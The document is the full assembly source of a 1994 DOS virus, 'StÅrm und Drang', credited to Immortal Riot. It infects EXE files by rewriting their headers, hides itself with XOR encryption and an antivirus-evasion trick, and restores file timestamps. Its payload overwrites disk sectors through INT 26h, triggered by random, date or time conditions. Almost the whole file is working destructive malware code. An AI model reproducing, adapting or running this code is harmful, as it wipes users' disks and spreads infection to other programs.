; ------------------------------------------------------------------------------
;
;                         - StÅrm und Drang -
;       Created by Immortal Riot's destructive development team
;              (c) 1994 The Unforgiven/Immortal Riot 
;
; ------------------------------------------------------------------------------
;               ˛ Undetectable/Destructive EXE-infector ˛
; ------------------------------------------------------------------------------
.model  tiny
.radix  16
.code
org     100h

virus_start:

call    get_delta                                

get_delta:                        
call    trick_tbscan

pop     bp                                       ; calculate the delta offset
sub     bp,get_delta-virus_start                 

jmp     short conzeal

trick_tbscan:

mov     ax,0305h                                 ; keyb i/o to beat tbscan
xor     bx,bx                    
int     16h                       
ret

conzeal:

call    decrypt                                  ; decrypt virus
jmp     short encryption_start                   ; and continue..

write_virus:                                

call    encrypt                                  ; write encrypted copy...
mov     ah,40   
mov     cx,virus_end-virus_start                 ; vir len
mov     dx,bp                                    ; fix correct offset
int     21h
call    decrypt                                  ; decrypt code again
ret

encryption_value dw 0

decrypt:                                         ; simple xor-encryption
encrypt:

lea     si,cs:[bp+encryption_start-virus_start]
mov     cx,(virus_end-encryption_start+1)/2
mov     dx,word ptr cs:[bp+encryption_value-virus_start]

xor_loopy:

xor     word ptr cs:[si],dx
inc     si
inc     si
loop    xor_loopy
ret

encryption_start:                          

mov     ah,2ch                                   ; get random
int     21h             
cmp     dl,02                                    ; 1/100 = 2?
je      nuke                                     ; yeh
			
mov     ah,2ah                                   ; get day
cmp     dl,02                                    ; day = 2?
je      nuke                                     ; yeh
cmp     cl,59d                                   ; minute = 59?
jne     no_bomb                                  ; if so, wipe

nuke:

mov     al,2                                     ; should only be used by
drive:                                           ; irresponsible maniacs
mov     cx,1                                                     
rndwipe:
lea     bx,[bp+v_name-virus_start]
cwd                            
sector:                           
int     26h                                                               
inc     cx              
jnc     sector           
inc     al                      
jmp     short drive

no_bomb:

mov     ax,es
add     ax,10
add     ax,cs:[bp+exe_header-virus_start+16]     ; add init off in para's of
						 ; cs from header
push    ax                                       ; 
push    cs:[bp+exe_header-virus_start+14]        ; store init off in bytes of
						 ; ip from cs

push    ds
push    cs
pop     ds

lea     dx,[bp+own_dta-virus_start]              ; set a new dta area
mov     ah,1ah                                   ; to eof
int     21h

get_drive:                                 

mov     ah,19h                                   ; get drive
int     21h                                      ; and dont infect
cmp     al,2                                     ; files on a: or b:
jae     find_files
jmp     reset_dta
					   
find_files:

mov     ah,4eh                                   ; seek first file, matching
next:                                            ; the extension 'exe'

lea     dx,[bp+exe_files-virus_start]
int     21

jnc     open_file                                ; find a file
jmp     reset_dta                                ; no more files

open_file:

lea     dx,[bp+own_dta-virus_start+1eh]          ; open file in ds:dx
mov     ax,3d02h                                 ; in read/write mode
int     21h

read_file:

xchg    ax,bx                                    ; file handle in bx

mov     ah,3f                                    ; read 1ch bytes
mov     cx,1ch                                   ; to exe_header
lea     dx,[bp+exe_header-virus_start]
int     21h

cmp     byte ptr ds:[bp+exe_header-virus_start],'M'       ; compare EXE file
jnz     no_exe                                            ; no MZ - no exe!

cmp     word ptr ds:[bp+exe_header-virus_start+12],'UE'   ; compare infection
jz      infected                                          ; assume infected

mov     al,2h                                    ; move file ptr eof
call    f_ptr                               

cmp     ax,2048d                                 ; too small to infect?
jb      too_small

push    dx                                       ; store dx/ax
push    ax

mov     ah,2ch                                   ; ger random value to
int     21h                                      ; use for encryption
jz      rndwipe                                  ; value, 0 = wipe 1ch sectors
mov     word ptr cs:[bp+encryption_value-virus_start],dx   

call    write_virus                              ; write virus to eof

mov     al,2                                     ; go eof
call    f_ptr

mov     cx,200                            
div     cx
inc     ax
mov     word ptr ds:[exe_header-virus_start+2+bp],dx 
mov     word ptr ds:[exe_header-virus_start+4+bp],ax 

pop     ax  ; ax = total number of 512 byte pages in the file  
pop     dx  ; dx = number of bytes in the last page in the image


mov     cx,10
div     cx

; "sub header size in para's", and
; fix new init offset in para's of code segment from the exe-header

sub     ax,word ptr ds:[exe_header-virus_start+8+bp]  
mov     word ptr ds:[exe_header-virus_start+16+bp],ax 


mov     word ptr ds:[exe_header-virus_start+14+bp],dx   ; fix new infection
mov     word ptr ds:[exe_header-virus_start+12+bp],'UE' ; marker!

; Now all important manipulations are executed, and we'll write the new
; header... 

xor     al,al                                           ; file ptr
call    f_ptr                                           ; tof

mov     ah,40                                           ; write new
mov     cx,1ch                                          ; modified
lea     dx,[bp+exe_header-virus_start]                  ; exe header
int     21h

no_exe:
infected:                                  
too_small:

lea     si,[bp+own_dta-virus_start+16h]                 ; set back org
mov     cx,word ptr [si]                                ; time/date to
mov     dx,word ptr [si+2]                              ; the infected file
mov     ax,5701h
int     21h

mov     ah,3eh                                          ; close file 
int     21h

mov     ah,4fh                                          ; and seek next file
jmp     next                                      

f_ptr:                                     

mov     ah,42h                                          ; this routine is
xor     cx,cx                                           ; called three time,
cwd                                                     ; i.e. bad optimized
int     21h                                             ; code, hehe!
ret                                        

reset_dta:

mov     dx,80h                                          ; set's back the
mov     ah,1ah                                          ; dta area
int     21h

quit:                                       
pop     ds                                              ; jmp org program
retf

v_name           db "[StÅrm und Drang!] (c) '94 The Unforgiven/Immortal Riot"

exe_files        db   "*.EXE",0     

exe_header       db     16 DUP(0)                 ; \
		 dw     0fff0                     ; -  EXE-HEADER
		 db     4  DUP(0)                 ; /
virus_end:
own_dta:
		end     virus_Start
